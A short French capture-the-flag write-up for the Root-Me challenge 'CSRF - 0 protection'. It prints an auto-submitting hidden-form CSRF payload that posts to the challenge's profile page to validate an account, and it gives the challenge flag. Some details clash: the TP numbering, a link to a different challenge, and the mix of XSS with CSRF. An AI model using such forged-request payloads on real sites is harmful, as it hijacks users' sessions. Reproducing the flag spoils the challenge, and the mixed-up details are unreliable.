---
title: "TP 3 : rootme 10"
excerpt: "CSRF - 0 protection"
coverImage: "https://www.tice-education.fr/images/stories/img/rootmelogo.jpg"
date: "2025-07-01T12:05:00.000Z"
ogImage:
    url: "https://www.tice-education.fr/images/stories/img/rootmelogo.jpg"
---

# TP 1 : CSRF - 0 protection

## Informations générales

-   **Nom du challenge** : CSRF - 0 protection
-   **Difficulté** : 3
-   **URL** : https://www.root-me.org/fr/Challenges/Web-Client/Javascript-Authentification

---

## 1. Compréhension du challenge

### Objectif : Trouver cookie admin

### Contexte technique : forum avec form sensible au xss

---

## 2. Étapes de résolution

### Étape 1 : créer un compte

### Étape 2 : aller dans le profil puis contact

### Etape 3 : utiliser la faille XSS de la page de contact pour effectuer une redirection javascript et une validation du formulaire POST

```html
<form
    name="test"
    method="POST"
    action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
>
    <input type="hidden" name="username" value="armand" />
    <input type="hidden" name="status" value="on" />
</form>
<script>
    document.test.submit();
</script>
```

### Etape 4 : Acceder à la page private en tant qu'admin et recuperer le flag

---

## 3. Capture ou extrait de code

![1](/assets/blog/rootme/step11-1.png)

![2](/assets/blog/rootme/step11-2.png)

![3](/assets/blog/rootme/step11-3.png)

---

## 4. Explication technique

### Vulnérabilité exploitée : Manque de prrotection XSS sur les champs

---

## 5. Résultat : Csrf_Fr33style-L3v3l1!

---

## 6. Prévention / bonnes pratiques :

### Proteger les input des attaques XSS
